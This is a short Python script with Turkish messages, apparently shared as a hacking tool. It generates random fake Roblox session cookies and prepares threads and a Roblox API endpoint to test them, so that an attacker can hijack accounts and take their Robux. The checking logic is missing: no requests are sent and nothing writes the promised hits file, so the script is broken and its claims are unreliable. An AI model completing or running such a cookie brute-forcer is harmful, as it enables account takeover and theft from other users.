import requests
import re
import string
import os
import threading
import random
import time
from queue import Queue


print('eger daha cok hacking yazilimi istiyorsan like at \n')
print('SCRIPT BY: mrx();#3621,\n')
print('bu yazilimin tum hakki mrx();#3621de')

outputfile = open("cookies.txt", "a")

x = 0
cookies = []
intro = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
n = 0
print('[Yerinde olsam yuksek deger secerim]')
c = int(input("NE kadar yaratim? \n"))
print('rastgele deger yaratiliyor lutfen sabirli ol  \n')
print('(islem uzun surebilir')
print('cok dusuk bir sansin var unutma) \n')
letters = 'ABCDEF'

while x < c:


    cookies =  intro +  ''.join(random.choices(letters + string.digits, k=732))

    x = x + 1
    
    f = open('Cookies.txt', "a+")
    f.write(f'{cookies}\n')
    f.close()
    

if __name__ == '__main__':

    number_of_threads = 900
    print_lock = threading.Lock()
    cookie_queue = Queue()
    url = 'https://accountinformation.roblox.com/v1/birthdate'

        
    cookie_queue.join()

outputfile.close()

t1 = time.time()
print('eger birsey bulduysam hits.txt dosyasina kaydedilecek')
input("cikmak icin entere bas")




 
